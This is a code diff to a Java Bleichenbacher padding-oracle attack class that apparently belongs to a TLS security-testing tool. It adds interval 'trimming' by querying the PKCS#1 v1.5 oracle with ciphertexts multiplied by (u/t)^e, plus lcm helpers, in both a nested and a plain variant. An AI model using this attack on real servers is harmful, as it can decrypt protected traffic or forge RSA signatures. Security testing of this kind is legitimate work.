@@ -16,6 +16,8 @@ import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.stream.Collectors;
+import java.util.stream.IntStream;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -528,9 +530,86 @@ public class Bleichenbacher extends Pkcs1Attack {
                 M.get(0).lower.toString(16),
                 M.get(0).upper.toString(16));
 
+        ArrayList<int[]> trimmers = new ArrayList<>();
+        for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
+            if (t <= 50) {
+                for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
+                    if (BigInteger.valueOf(u).gcd(BigInteger.valueOf(t)).equals(BigInteger.ONE)) {
+                        trimmers.add(new int[] {u, t});
+                    }
+                }
+            } else { // t > 50
+                trimmers.add(new int[] {t - 1, t});
+                trimmers.add(new int[] {t + 1, t});
+            }
+        }
+        ArrayList<int[]> utPairs = new ArrayList<>();
+
+        for (int[] ut : trimmers) {
+            int u = ut[0];
+            int t = ut[1];
+
+            BigInteger uBI = BigInteger.valueOf(u);
+            BigInteger tBI = BigInteger.valueOf(t);
+
+            BigInteger cipherbig = new BigInteger(1, ciphertext);
+
+            BigInteger result =
+                    cipherbig
+                            .multiply(
+                                    (uBI.multiply(tBI.modInverse(innerPublicKey.getModulus())))
+                                            .modPow(
+                                                    innerPublicKey.getPublicExponent(),
+                                                    innerPublicKey.getModulus()))
+                            .mod(innerPublicKey.getModulus());
+
+            BigInteger encryptedAttempt = encryptBigInt(result, outerPublicKey);
+
+            if (queryOracle(
+                    encryptedAttempt,
+                    true)) { // assuming the oracle and util method exists and does what expected
+                utPairs.add(new int[] {u, t});
+            }
+        }
+
+        if (!utPairs.isEmpty()) {
+
+            ArrayList<Integer> t_values = new ArrayList<>();
+            for (int[] pair : utPairs) {
+                t_values.add(pair[1]);
+            }
+
+            int t_prime = lcm_n(t_values);
+
+            int u_min = Integer.MAX_VALUE;
+            int u_max = Integer.MIN_VALUE;
+            for (int[] pair : utPairs) {
+                int current = pair[0] * t_prime / pair[1];
+                if (current < u_min) {
+                    u_min = current;
+                }
+                if (current > u_max) {
+                    u_max = current;
+                }
+            }
+
+            BigInteger a =
+                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
+            BigInteger b =
+                    three_B_sub_one
+                            .multiply(BigInteger.valueOf(t_prime))
+                            .divide(BigInteger.valueOf(u_max));
+
+            M = new ArrayList<>();
+            M.add(new Interval(a, b));
+            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
+        } else {
+            LOGGER.debug("UT-Paris where empty");
+        }
+
         BigInteger s =
                 find_smallest_s_nested(
-                        ceil(innerPublicKey.getModulus().add(two_B), three_B_sub_one),
+                        ceil(innerPublicKey.getModulus().add(two_B), M.get(0).lower),
                         ciphertext,
                         innerPublicKey,
                         outerPublicKey);
@@ -558,6 +637,36 @@ public class Bleichenbacher extends Pkcs1Attack {
             }
             M = updateInterval(M, s, innerPublicKey);
         }
+    }
+
+    // Define the lcm method
+    public static int lcm(int a, int b) {
+        int tempA = a;
+        int tempB = b;
+        while (tempB != 0) {
+            int temp = tempB;
+            tempB = tempA % tempB;
+            tempA = temp;
+        }
+        return a * (b / tempA);
+    }
+
+    // Define the lcm_n method
+    public static int lcm_n(ArrayList<Integer> list) {
+        ArrayList<Integer> ns = new ArrayList<>(list);
+        int log = (int) (Math.log(ns.size()) / Math.log(2) + 1);
+        for (int i = 0; i < log; i++) {
+            ArrayList<Integer> finalNs = ns;
+            List<Integer> nsNext =
+                    IntStream.range(0, ns.size() / 2)
+                            .mapToObj(k -> lcm(finalNs.get(2 * k), finalNs.get(2 * k + 1)))
+                            .collect(Collectors.toList());
+            if (ns.size() % 2 != 0) {
+                nsNext.add(ns.get(ns.size() - 1));
+            }
+            ns = new ArrayList<>(nsNext);
+        }
+        return ns.get(0);
     }
 
     /**
@@ -588,9 +697,84 @@ public class Bleichenbacher extends Pkcs1Attack {
                 M.get(0).lower.toString(16),
                 M.get(0).upper.toString(16));
 
+        ArrayList<int[]> trimmers = new ArrayList<>();
+        for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
+            if (t <= 50) {
+                for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
+                    if (BigInteger.valueOf(u).gcd(BigInteger.valueOf(t)).equals(BigInteger.ONE)) {
+                        trimmers.add(new int[] {u, t});
+                    }
+                }
+            } else { // t > 50
+                trimmers.add(new int[] {t - 1, t});
+                trimmers.add(new int[] {t + 1, t});
+            }
+        }
+        ArrayList<int[]> utPairs = new ArrayList<>();
+
+        for (int[] ut : trimmers) {
+            int u = ut[0];
+            int t = ut[1];
+
+            BigInteger uBI = BigInteger.valueOf(u);
+            BigInteger tBI = BigInteger.valueOf(t);
+
+            BigInteger cipherbig = new BigInteger(1, ciphertext);
+
+            BigInteger result =
+                    cipherbig
+                            .multiply(
+                                    (uBI.multiply(tBI.modInverse(publicKey.getModulus())))
+                                            .modPow(
+                                                    publicKey.getPublicExponent(),
+                                                    publicKey.getModulus()))
+                            .mod(publicKey.getModulus());
+
+            if (queryOracle(
+                    result,
+                    false)) { // assuming the oracle and util method exists and does what expected
+                utPairs.add(new int[] {u, t});
+            }
+        }
+
+        if (!utPairs.isEmpty()) {
+
+            ArrayList<Integer> t_values = new ArrayList<>();
+            for (int[] pair : utPairs) {
+                t_values.add(pair[1]);
+            }
+
+            int t_prime = lcm_n(t_values);
+
+            int u_min = Integer.MAX_VALUE;
+            int u_max = Integer.MIN_VALUE;
+            for (int[] pair : utPairs) {
+                int current = pair[0] * t_prime / pair[1];
+                if (current < u_min) {
+                    u_min = current;
+                }
+                if (current > u_max) {
+                    u_max = current;
+                }
+            }
+
+            BigInteger a =
+                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
+            BigInteger b =
+                    three_B_sub_one
+                            .multiply(BigInteger.valueOf(t_prime))
+                            .divide(BigInteger.valueOf(u_max));
+
+            M = new ArrayList<>();
+            M.add(new Interval(a, b));
+            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
+        } else {
+            LOGGER.debug("UT-Paris where empty");
+        }
+
         BigInteger s =
                 find_smallest_s(
-                        ceil(publicKey.getModulus().add(two_B), three_B_sub_one),
+                        ceil(publicKey.getModulus().add(two_B), M.get(0).lower),
                         ciphertext,
                         publicKey);
 
